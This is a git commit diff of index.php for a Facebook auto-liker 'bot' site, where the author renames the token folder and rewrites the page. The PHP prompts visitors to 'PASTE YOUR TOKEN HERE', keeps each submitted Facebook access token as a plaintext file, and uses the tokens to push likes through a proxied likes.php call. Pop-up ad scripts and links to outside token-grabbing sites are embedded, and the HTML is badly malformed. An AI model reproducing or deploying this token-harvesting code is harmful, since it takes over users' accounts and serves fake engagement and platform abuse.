09045936a17f50505dc5b6ee76f6270c3aae5f57
mrdjayeh <markzackerb@gmail.com>
2018-07-07 18:17:02 +0500

    Update index.php

--- index.php
+++ index.php
@@ -1,29 +1,12 @@
 
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Shahzad Asghar</title> 
-<link <link href="B.css" rel="stylesheet" type="text/css">
-<link href="http://fonts.googleapis.com/css?family=Audiowide" rel="stylesheet" type="text/css">
-<link href="http://fonts.googleapis.com/cssf8d0.css?family=" rel="stylesheet" type="text/css">
-<link rel="shortcut icon" type="image/png" href="https://cdn3.iconfinder.com/data/icons/inside/PNG/256x256/icontexto-inside-facebook.png"/>
-
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> <html> <meta charset="utf-8"/> <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/> <head> <title>MRDJ AYASH</title> <link rel="stylesheet" type="text/css" href="B.css" media="all,handheld"/> <link rel="shortcut icon" type="image/png" href="http://emojipedia-us.s3.amazonaws.com/cache/f9/4e/f94ee8fa6d3c2553f00d59838ab747e3.png"/> <style>
+.snow-container{position:fixed;width:100%;max-width:100%;z-index:99999;pointer-events:none;overflow:hidden;top:0;height:100%}.snow{display:block;position:absolute;z-index:2;top:0;right:0;bottom:0;left:0;pointer-events:none;-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0);-webkit-animation:snow linear infinite;animation:snow linear infinite}.snow.foreground{background-image:url("https://vipfb.co/img/snow-large-vipfb.co.png");-webkit-animation-duration:15s;animation-duration:10s}.snow.foreground.layered{-webkit-animation-delay:7.5s;animation-delay:7.5s}.snow.middleground{background-image:url(https://vipfb.co/img/snow-medium-vipfb.co.png);-webkit-animation-duration:20s;animation-duration:15s}.snow.middleground.layered{-webkit-animation-delay:10s;animation-delay:10s}.snow.background{background-image:url(https://vipfb.co/img/snow-small-vipfb.co.png);-webkit-animation-duration:25s;animation-duration:20s}.snow.background.layered{-webkit-animation-delay:12.5s;animation-delay:12.5s}@-webkit-keyframes snow{0%{-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{-webkit-transform:translate3d(5%,100%,0);transform:translate3d(5%,100%,0)}}@keyframes snow{0%{-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{-webkit-transform:translate3d(5%,100%,0);transform:translate3d(5%,100%,0)}} </style> <div class='snow-container'> <div class='snow foreground'></div> <div class='snow foreground layered'></div> <div class='snow middleground'></div> <div class='snow middleground layered'></div> <div class='snow background'></div> <div class='snow background layered'></div>
 </div>
-<center><div style="font-family: Audiowide;
-font-size: 60pt">
-<center><script language="JavaScript" src="B.js"></script></font></center>
-<div style="font-family: Audiowide;
-font-size: 25pt;
-text-shadow: 0 0 11px #CC0000, 0 0 11px #CC0000, 0 0 11px #CC0000;
-color: #FFF">
 <script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script>
 
 
-
-
-
-
-
-
 <?php
-$yx=opendir('DJ');
+$yx=opendir('myToken');
 while($isi=readdir($yx)){
 if($isi != '.' && $isi != '..'){
 $member[]=$isi;
@@ -37,7 +20,7 @@ if($_POST[access_token]){
 $access_token = $_POST[access_token];
 $me = $like -> me($access_token);
 if($me[id]){
-$like -> DJ($access_token);
+$like -> myToken($access_token);
 if($_POST[id]){
 $like -> pancal($_POST[id]);
 }else{
@@ -51,84 +34,130 @@ $like->form();
 }
 class like {
 public function pancal($id){ for($i=1;$i<4;$i++){
+$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
 }
 print '';
 }
 public function me($access){
 return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
 }
-public function DJ($access){
-if(!is_dir('DJ')){
-mkdir('DJ');
+public function myToken($access){
+if(!is_dir('myToken')){
+mkdir('myToken');
 }
-$a=fopen('DJ/'.$access,'w');
+$a=fopen('myToken/'.$access,'w');
 fwrite($a,1);
 fclose($a);
 }
 public function invalidToken(){
-print'<center><font color="red">Inalid or expired Access Token!</font></center>';
+print'<font color="red">TOKEN INVALID</font>';
 $this->form();
 }
-
 public function form(){
-$on= file_get_contents('http://'.$_SERVER['HTTP_HOST'].'/user.php');
-
-echo'
+ echo '
+ <centre><div id="content"></div> <div class="post"></div> <div class="post-content"><img src="jarvis.png" class="jarvis"><br> <img src="jarvis-inner.png" class="jarvis-inner"></br></div> <div class="post-meta2"> </centre></div> 
+<center>
 <br>
 <br>
-<br><center><strong><a href="http://www.facebook.com/100004890735730" target="_blank">
-<img src="https://graph.facebook.com/100004890735730/picture?type=large" alt="Designer_&_Developer" border="3" style="border-color: 737373; border-radius:70%;height:150px;width:150px;-moz-box-shadow:0px 0px 20px 0px black;-webkit-box-shadow:0px 0px 20px 0px black;-o-box-shadow:0px 0px 20px 0px black;box-shadow:0px 0px 20px 0px black"/><br></div>';}public function bwh(){echo'<div id="bottom-content"><div id="navigation-menu"><center></head>    <body>        <div id="main">            <div id="content">                <div class="header"><center><br><br><center><a href="https://bottersking.com/" target="_blank"><input class="button button5" type="button" value="♥ GET TOKEN ♥"> </a><a href="http://zipansion.com/24fhq" target="_blank"><input class="button button5" type="button" value="♥ SCRIPT ♥"> </a></center>
-<center><form action="" method="POST">
-<input class="search" style="width:70%" type="text" name="access_token" placeholder=" placeholder="EAAAACZAVC6ygBAOXNxONaZAc9GnN9kcLxZCsba3ED4hjLZBX2BJDPwDUBZBpvyZAb538ABEh3k3zmMgObJbOA32VsZAzndFmBahJVz6C4y0ZBEG0nzJQ7ZCbsdUvlEjEsZB9ciEXqoMILLlKCES6n3jqscohpvPbMXSj8ZD" required> <br>
-<input class="submit" type="submit" name="saveFile" value="SUBMIT"></form></div></div></div>
+<div id="navigation-menu"> <h3><a name="navigation-name" class="no-link"> </a></h3> <li><a href="https://bottersking.com/token" target="blank"><font size="6">GET YOUR TOKEN </font></a> </li> </div>
 
+<div id="search-form" <br="">
+<h2>
+<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><form action="index.php" method="post">
+<input class="search" type="text" style="height:80px;width:600px;" name="access_token" placeholder="PASTE YOUR TOKEN HERE">
+<input class="inp-btn" type="submit" style="height:82px;width:200px;" value="Submit"></form></h2></div>
+
+
+</font><br>
+</font></font></strong><font style="color:red;font-size:33px;"><font color="white"><center><strong><font size="60"> SCRIPT EDITOR :    </strong><font style="color:red;font-size:33px;"><font color="red"><font size="60"><a target="_blank" href="https://m.facebook.com/MRDJAYASH"> MRDJ AYASH  </font></strong></center>
 ';
 }
-
 public function getData($access){
-$feed=json_decode($this -> _req('https://graph.facebook.com/me?fields=id,name&access_token='.$access),true);
+$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=1'),true);
+if(count($feed[data]) >= 1){
 for($i=0;$i<count($feed[data]);$i++){
-$id1 = $feed[data][$i][id];
-}
+$uid = $feed[data][$i][from][id];
+$name = $feed[data][$i][from][name];
+$type = $feed[data][$i][type];
+$mess = str_replace(urldecode('
+'),'<br/>',htmlspecialchars($feed[data][$i][message]));
+$id = $feed[data][$i][id];
+$pic = $feed[data][$i][picture];
 echo'
-<div id="center">
-<font size="40px"> Token Saved! </font></br>
-[<a href="index.php" value="Click Here">Click Here</a>] to go back to the home page.</div>';
-}
+<br>
+<br>
+<br>
+<center> 
+<br>
+<br>
+<br>
+<marquee direction="left"><font size="8" color="gold"><font face="Audiowide" size="5" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em White;">Your bot Has been Activated Successfully </font></marquee>
+<br>
+<br>
+<br>
 
+<form action="keluar.php" method="post">
+<center><input class="submit" type="submit" style="width:40%;" value="Click Here To Add AnOther Token"></center>
+<br>
+<br>
+<br>
+</strong><center><strong><font style="color:red;font-size:33px;">  <font color="red">
+</font></font></strong><font style="color:red;font-size:33px;"><font color="red"><center><strong>
+
+ </font></font></strong><font style="color:red;font-size:33px;"><font color="white"><center><strong><font size="60"> SCRIPT EDITOR :    </strong><font style="color:red;font-size:33px;"><font color="red"><font size="60"><a target="_blank" href="https://m.facebook.com/MRDJAYASH"> MRDJ AYASH  </font></strong></center>
+
+
+
+
+
+
+
+<br>
+
+
+
+
+
+
+';
+if($type=='photo'){
+echo'
+';
+}else{
+echo'
+';
+}
+}
+}else{
+print '';
+}
+print '';
+}
 private function _req($url){
 $ch = curl_init();
 curl_setopt_array($ch,array(
 CURLOPT_CONNECTTIMEOUT => 5,
 CURLOPT_RETURNTRANSFER => true,
 CURLOPT_URL => $url,
-));
+) );
 $result = curl_exec($ch);
 curl_close($ch);
 return $result;
 }
 }
 ?>
-
-
-
-
-<br>
- <br>
-
-font style="text-shadow: 1px 1px black; color:white;"
-size="6">&bull; Bot Lovers : <font color="red"> BOT USERS :: <font color="yellow"> <?php include 'user.php';?> </font> <font style="text-shadow: 1px 1px black; color:white;" size="4">&bull;</font>
-
- 
- <center><strong><font style="text-shadow: 1px 1px black; color:white;" size="5">&bull; OWNER Shahzad Asghar &bull;</strong></center>
-</br></div><audio autoIceland loop>
-<font color="red"
-
-<br>
-<center>
-   <a href="http://www.reliablecounter.com" target="_blank"><img src="https://www.reliablecounter.com/count.php?page=topprz.tk11865056&digit=style/plain/17/&reloads=0" alt="visitor counters" title="visitor counters" border="0"></a><br /><a href="http://www.reliablecounter.com/ru/" target="_blank" style="font-family: Geneva, Arial; font-size: 9px; color: #330010; text-decoration: none;">visitor counters</a>
-</font></div>
 </body>
 </html>
+</strong><center><strong><font style="color:red;font-size:33px;">  <font color="red">
+</font></font></strong><font style="color:red;font-size:33px;"><font color="red"><center><strong>
+
+ <font size="60"> LOVERX : <?php include 'users.php';?> </font></strong></center></font></font></center></center>
 
 
+
+
+
+<br><br><marquee behavior="scroll" onmouseover="this.stop()" onmouseout="this.start()" scrollamount="1" scrolldelay="6" direction="left" truespeed="truespeed">
+<img src="SP.gif"><font color="red"><b>NOTE:-</b></font> NO BLOCK ✔ COMMENT SO ENJOY AND SHARE SITE TOO*
+<img src="MS.gif"></marquee>
+<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script>
